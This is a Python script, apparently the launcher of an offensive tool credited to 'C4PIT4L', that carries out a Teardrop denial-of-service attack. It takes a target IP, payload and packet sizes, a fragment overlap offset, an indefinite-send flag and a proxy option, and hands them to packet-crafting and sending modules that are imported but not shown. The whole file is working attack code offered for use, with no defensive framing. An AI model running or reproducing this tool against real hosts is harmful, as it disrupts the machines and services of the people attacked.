"""
#---------------------------------------------------------------------------------#
Teardrop.py is a script to initiate a Teardrop attack using fragmented packets.
- Created By: C4PIT4L
#---------------------------------------------------------------------------------#
"""

import argparse
import sys
from src.packet_crafter import PacketCrafter
from src.packet_sender import PacketSender
from colorama import Fore, Style, init

init(autoreset=True)

def display_banner():
    print(Fore.RED + Style.BRIGHT + '''                  
                 .:                 
                 ;;                 
                ;;;;                
               ;;;;;;               
              ;;;;;;.;              
            .;;;;;;;; ;:            
           :;;;;;;;;;;;;:           
          .;;;;;;;;;;;;;;.          
          ;;;;;;;;;;;;;;;;          
         ;;;;;;;;;;;;;;;;;;         
         ;;:;;;;;;;;;;;;;;;         
         ;;.:;;;;;;;;;;;;;;         
          ;;  ;;;;;;;;;;;;          
           ;;;    ;;;;;;;           
             :;;;;;;;;:             
                                                         
    ''')

def parse_arguments():
    parser = argparse.ArgumentParser(description="Teardrop Attack: Fragmented Packet Sender")

    parser.add_argument('target_ip', type=str, help="Target IP address for the attack")
    parser.add_argument('payload_size', type=int, nargs='?',default=5000, help="Size of the payload (in bytes)")
    parser.add_argument('--frag_overlap_offset', type=int, default=0, help="Overlap offset for fragments")
    parser.add_argument('--packet_size', type=int, default=1500, help="Size of each packet (default: 1500)")
    parser.add_argument('--indefinite', action='store_true', help="Send packets indefinitely")
    parser.add_argument('--proxy', type=str, help="Proxy server (e.g., http://127.0.0.1:8080, socks5://127.0.0.1:1080)")

    return parser.parse_args()

def main():
    display_banner()

    args = parse_arguments()

    if args.payload_size <= 0:
        print(Fore.RED + "Invalid payload size. It must be a positive integer.")
        sys.exit(1)

    if args.packet_size <= 20:
        print(Fore.RED + "Packet size must be greater than 20 bytes.")
        sys.exit(1)

    print(Fore.YELLOW + f"Target IP: {args.target_ip}")
    print(Fore.YELLOW + f"Payload size: {args.payload_size} bytes")
    print(Fore.YELLOW + f"Packet size: {args.packet_size} bytes")
    print(Fore.YELLOW + f"Fragment overlap offset: {args.frag_overlap_offset}")

    packet_crafter = PacketCrafter(args.target_ip, args.payload_size, args.frag_overlap_offset, args.packet_size)

    print(Fore.CYAN + "Crafting the fragmented packets...")
    fragments = packet_crafter.generate_fragments()

    packet_sender = PacketSender(fragments, args.target_ip, proxy=args.proxy)

    print(Fore.GREEN + "Starting the attack...")

    if args.indefinite:
        packet_sender.send_fragments_indefinitely()
    else:
        packet_sender.send_fragments()

    print(Fore.RED + "Attack completed.")

if __name__ == "__main__":
    main()
